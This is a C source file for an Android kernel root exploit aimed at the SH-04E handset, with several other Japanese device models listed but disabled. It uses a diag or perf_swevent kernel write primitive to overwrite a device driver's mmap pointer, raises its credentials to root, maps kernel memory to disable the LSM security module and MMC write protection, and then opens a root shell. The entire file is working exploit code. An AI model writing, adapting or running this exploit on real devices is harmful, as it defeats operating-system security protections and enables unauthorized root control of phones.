#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "creds.h"
#include "perf_swevent.h"
#include "libdiagexploit/diag.h"
#include "unlock.h"

#define FOPS_MMAP_POS   10

typedef struct _supported_device {
  const char *device;
  const char *build_id;
  const char *patchdev_name;
  unsigned long int patchdev_fops_address;
} supported_device;

static supported_device supported_devices[] = {
  { "SH-04E",           "01.00.02",           "/dev/shtimer", 0xc0dd3de4 },

// FIXME: we cannot modify mmap for ashmem, that is already used.
#if 0
  { "F-11D",            "V24R40A"   ,         0xc08ff1f4 },
  { "URBANO PROGRESSO", "010.0.3000",         0xc091b9cc },
  { "SCL21",            "IMM76D.SCL21KDALJD", 0xc0b6a684 },
  { "ISW13F",           "V69R51I",            0xc092e484 },
  { "IS17SH",           "01.00.04",           0xc0a407bc },
#endif
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static bool
setup_patchdev(const char **patchdev_name, unsigned long int *patchdev_mmap_address)
{
  int i;
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  *patchdev_name = NULL;
  *patchdev_mmap_address = 0;

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
      *patchdev_name = supported_devices[i].patchdev_name;
      *patchdev_mmap_address = supported_devices[i].patchdev_fops_address + 4 * FOPS_MMAP_POS;
      return true;
    }
  }

  printf("%s (%s) is not supported.\n", device, build_id);
  return false;
}

const char *patchdev_name;

struct file;

struct vm_area_struct {
        void *vm_mm;
        unsigned long vm_start, vm_end;
        void *vm_next, *vm_prev;
        unsigned long int vm_page_prot;
        /* ... */
};

int (*io_remap_pfn_range)(struct vm_area_struct *, unsigned long addr,
        unsigned long pfn, unsigned long size, unsigned long int) = (void *)0xc00e458c;

// FIXME: adjust KERNEL_PHYS_OFFSET from CONFIG_PHYS_OFFSET value for each device
#define KERNEL_PHYS_OFFSET      0x80208000      // SH-04E

#define KERNEL_SIZE             0x10000000
#define PAGE_SHIFT              12

int
obtain_root_privilege(struct file *filp, struct vm_area_struct *vma)
{
  int ret;

  commit_creds(prepare_kernel_cred(0));

  return io_remap_pfn_range(vma, vma->vm_start, KERNEL_PHYS_OFFSET >> PAGE_SHIFT,
      vma->vm_end - vma->vm_start, vma->vm_page_prot);
}

static bool
run_obtain_root_privilege(void)
{
  void *address = NULL;
  void *start_address =(void *)0x10000000;
  int fd;

  fd = open(patchdev_name, O_RDWR);
  if (fd < 0) {
    printf("open failed for %s: %s\n", patchdev_name, strerror(errno));
    return false;
  }

  address = mmap(start_address, KERNEL_SIZE,
       PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, fd, 0);

  if (address == MAP_FAILED) {
    printf("mmap failed for %s: %s\n", patchdev_name, strerror(errno));
    close(fd);
    return false;
  }

  unlock_lsm(address);
  unlock_mmc_protect_part(address);

  munmap(address, KERNEL_SIZE);

  close(fd);

  return true;
}

static bool
attempt_perf_swevent_exploit(unsigned long int address)
{
  int number_of_children;

  number_of_children = perf_swevent_write_value_at_address(address, (unsigned long int)&obtain_root_privilege);
  if (number_of_children == 0) {
    while (true) {
      sleep(1);
    }
  }

  run_obtain_root_privilege();

  perf_swevent_reap_child_process(number_of_children);

  return true;
}

static bool
attempt_diag_exploit(unsigned long int address)
{
  struct diag_values injection_data;

  injection_data.address = address;
  injection_data.value = (uint16_t)&obtain_root_privilege;

  if (!diag_inject(&injection_data, 1)) {
    return false;
  }

  run_obtain_root_privilege();

  injection_data.value = 3;
  return diag_inject(&injection_data, 1);
}

int
main(int argc, char **argv)
{
  unsigned long int address;
  int fd;
  bool success;

  if (!setup_patchdev(&patchdev_name, &address)) {
    printf("You need to manage to select device name and get it's file_operations address.\n");
    exit(EXIT_FAILURE);
  }

  if (!setup_creds_functions()) {
    printf("You need to manage to get prepare_kernel_cred and commit_creds addresses.\n");
    exit(EXIT_FAILURE);
  }

  success = attempt_diag_exploit(address);
  if (!success) {
    printf("\nAttempt perf_swevent exploit...\n");
    success = attempt_perf_swevent_exploit(address);
  }

  if (getuid() != 0) {
    printf("Failed to obtain root privilege.\n");
    exit(EXIT_FAILURE);
  }

  system("/system/bin/sh");

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
